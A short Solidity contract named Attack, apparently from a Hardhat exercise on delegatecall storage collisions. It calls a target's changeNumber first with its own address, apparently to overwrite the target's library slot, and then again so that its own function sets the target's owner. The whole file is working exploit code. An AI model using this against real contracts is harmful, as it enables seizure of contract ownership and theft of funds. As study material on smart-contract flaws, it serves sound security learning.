// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import "hardhat/console.sol";

contract Attack {
    address public lib;
    address public owner;
    uint public number;

    function attack(address target) external {
        console.log(address(this));
        console.log(uint160(address(this)));
        console.log(uint(uint160(address(this))));

        (bool ok, ) = target.call(
            abi.encodeWithSignature(
                "changeNumber(uint256)",
                uint(uint160(address(this)))
            )
        );

        (bool ok2, ) = target.call(
            abi.encodeWithSignature("changeNumber(uint256)", 1)
        );

        assert(ok);
        assert(ok2);
    }

    function changeNumber(uint _num) external {
        number = _num;
        owner = msg.sender;
    }
}
